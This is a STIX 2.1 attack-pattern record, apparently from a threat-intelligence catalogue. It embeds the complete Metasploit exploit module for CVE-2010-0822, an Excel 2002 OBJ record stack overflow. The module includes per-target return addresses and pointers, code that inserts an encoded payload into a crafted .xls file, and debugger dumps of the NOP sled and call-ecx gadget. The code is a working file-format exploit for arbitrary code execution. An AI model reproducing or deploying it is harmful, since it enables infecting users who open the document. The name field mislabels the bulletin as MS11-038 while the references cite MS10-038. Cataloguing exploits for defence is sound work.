{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1b431467-29b1-402a-b410-7569defcf721",
    "created": "2024-08-14T16:38:09.833273Z",
    "modified": "2024-08-14T16:38:09.833278Z",
    "name": "\"MS11-038 Microsoft Office Excel Malformed OBJ Record Handling Overflow\"",
    "description": " This module exploits a vulnerability found in Excel 2002 of Microsoft Office XP. By supplying a .xls file with a malformed OBJ (recType 0x5D) record an attacker can get the control of the execution flow. This results in arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms10_038_excel_obj_bof.rb",
            "external_id": "ms10_038_excel_obj_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0822"
        },
        {
            "source_name": "reference",
            "url": "https://www.exploit-db.com/moaub-24-microsoft-excel-obj-record-stack-overflow/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS11-038 Microsoft Office Excel Malformed OBJ Record Handling Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Excel 2002 of Microsoft Office XP.\n        By supplying a .xls file with a malformed OBJ (recType 0x5D) record an attacker\n        can get the control of the execution flow. This results in arbitrary code execution under\n        the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nicolas Joly', # Initial discovery\n          'Shahin Ramezany <shahin[at]abysssec.com>', # MOAUB 24 exploit and binary analysis\n          'juan vazquez'  # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2010-0822'],\n          ['OSVDB', '65236'],\n          ['BID', '40520'],\n          ['MSB', 'MS10-038'],\n          ['URL', 'https://www.exploit-db.com/moaub-24-microsoft-excel-obj-record-stack-overflow/']\n        ],\n      'Payload'        =>\n        {\n          'Space' => 4000\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'          => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            # This is the one that can be downloaded from MSDN\n            'Microsoft Office Excel 2002 10.2614.2625 Service Pack 0(Office XP) on Windows XP SP3',\n            {\n              'ftCmoReserved' => 0x307d91ac, # Ptr to CraftedPointer-4 in the stored contents on Excel .data\n              'CraftedPointer' => 0x307d91a6, # Ptr to PtrToRet in the stored contents on Excel .data\n              'PtrToRet' => 0x307d908e, # Ptr to Ret - 11Ch\n              'Ret' => 0x30006113 # call ecx from Excel.exe 10.0.2614.0\n            }\n          ],\n          [\n            'Microsoft Office Excel 2002 10.6501.6626 Service Pack 3 (Office XP SP3) on Windows XP SP3',\n            {\n              'ftCmoReserved' => 0x307de5ac, # Ptr to CraftedPointer-4 in the stored contents on Excel .data\n              'CraftedPointer' => 0x307de5a6, # Ptr to PtrToRet in the stored contents on Excel .data\n              'PtrToRet' => 0x307de48e, # Ptr to Ret - 11Ch\n              'Ret' => 0x300061a5 # call ecx from Excel.exe 10.0.6501.0\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-06-08',\n      'DefaultTarget'  => 1))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [true, 'The filename', 'msf.xls'])\n        ])\n  end\n\n  def exploit\n\n    path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2010-0822.xls')\n    f = File.open(path, 'rb')\n    template = f.read\n    f.close\n    buf  = ''\n    buf << template[0..35016]\n    buf << [target['ftCmoReserved']].pack('V')\n    buf << template[35021..36549]\n    buf << [target['PtrToRet']].pack('V')\n    buf << [target.ret].pack('V')\n    buf << template[36558..36559]\n    buf << [target['CraftedPointer']].pack('V')\n    buf << template[36564..36609]\n    buf << [target['CraftedPointer']].pack('V') # Pass the MSO_804()\n    buf << template[36614..36639]\n    buf << payload.encoded\n    buf << template[40640..template.length]\n    file_create(buf)\n\n  end\nend\n\n=begin\n\nMemory analysis on Office XP SP2\n\n'ftCmoReserved' => 0x307de5ac, # Ptr to CraftedPointer-4 in the stored contents on Excel .data\n------------------------------------------------------------------------------------------\n\n0:000> db 0x307de5ac\n307de5ac  00 30 74 00 a6 e5 7d 30-4c 4c 00 55 6e 69 72 42  .0t...}0LL.UnirB\n307de5bc  42 42 42 4c 00 48 50 44-6f 63 55 49 53 55 49 00  BBBL.HPDocUISUI.\n307de5cc  54 72 75 65 00 52 65 73-6f 6c 75 74 69 6f 6e 00  True.Resolution.\n307de5dc  36 30 30 64 70 69 a6 e5-7d 30 74 52 65 73 00 46  600dpi..}0tRes.F\n307de5ec  61 6c 73 65 90 90 90 90-90 90 90 90 90 90 90 90  alse............\n307de5fc  90 90 90 90 41 41 41 41-41 41 41 41 41 41 41 41  ....AAAAAAAAAAAA\n307de60c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n307de61c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n\n'CraftedPointer' => 0x307de5a6, # Ptr to PtrToRet in the stored contents on Excel .data\n-----------------------------------------------------------------------------------\n\n0:000> db 0x307de5a6\n307de5a6  8e e4 7d 30 a5 61 00 30-74 00 a6 e5 7d 30 4c 4c  ..}0.a.0t...}0LL\n307de5b6  00 55 6e 69 72 42 42 42-42 4c 00 48 50 44 6f 63  .UnirBBBBL.HPDoc\n307de5c6  55 49 53 55 49 00 54 72-75 65 00 52 65 73 6f 6c  UISUI.True.Resol\n307de5d6  75 74 69 6f 6e 00 36 30-30 64 70 69 [[a6 e5 7d 30]]*  ution.600dpi..}0\n307de5e6  74 52 65 73 00 46 61 6c-73 65 90 90 90 90 90 90  tRes.False......\n307de5f6  90 90 90 90 90 90 90 90-90 90 41 41 41 41 41 41  ..........AAAAAA\n307de606  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n307de616  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n\n* => 0x307de5a6 + 0x3c => 0x307de5e2\n\n'PtrToRet' => 0x307de48e, # Ptr to Ret - 11Ch\n---------------------------------------------\n\n307de48e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de49e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de4ae  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de4be  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de4ce  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de4de  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de4ee  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de4fe  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de50e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de51e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de52e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de53e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de54e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de55e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de56e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de57e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de58e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n307de59e  eb 60 6e 00 50 72 69 6e-8e e4 7d 30 [[a5 61 00 30]]*  .`n.Prin..}0.a.0\n307de5ae  74 00 a6 e5 7d 30 4c 4c-00 55 6e 69 72 42 42 42  t...}0LL.UnirBBB\n307de5be  42 4c 00 48 50 44 6f 63-55 49 53 55 49 00 54 72  BL.HPDocUISUI.Tr\n307de5ce  75 65 00 52 65 73 6f 6c-75 74 69 6f 6e 00 36 30  ue.Resolution.60\n307de5de  30 64 70 69 a6 e5 7d 30-74 52 65 73 00 46 61 6c  0dpi..}0tRes.Fal\n307de5ee  73 65 90 90 90 90 90 90-90 90 90 90 90 90 90 90  se..............\n307de5fe  90 90 41 41 41 41 41 41-41 41 41 41 41 41 41 41  ..AAAAAAAAAAAAAA\n307de60e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n307de61e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n307de62e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n307de63e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n307de64e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n307de65e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n307de66e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n307de67e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n\n* 0x307de48e + 0x11c => 0x307de48e\n\n'Ret' => 0x300061a5 # call ecx from Excel.exe 10.0.6501.0\n----------------------------------------------------------\n\nEXCEL!Ordinal41+0x61a5:\n300061a5 ffd1            call    ecx\n300061a7 e00b            loopne  EXCEL!Ordinal41+0x61b4 (300061b4)\n300061a9 c1536689        rcl     dword ptr [ebx+66h],89h\n300061ad 46              inc     esi\n300061ae 2a8d8574ffff    sub     cl,byte ptr [ebp-8B7Bh]\n300061b4 ff5068          call    dword ptr [eax+68h]\n300061b7 1200            adc     al,byte ptr [eax]\n300061b9 0400            add     al,0\n\n=end\n",
    "x_mitre_disclosure_date": "2010-06-08",
    "x_mitre_platforms": [
        "win'"
    ]
}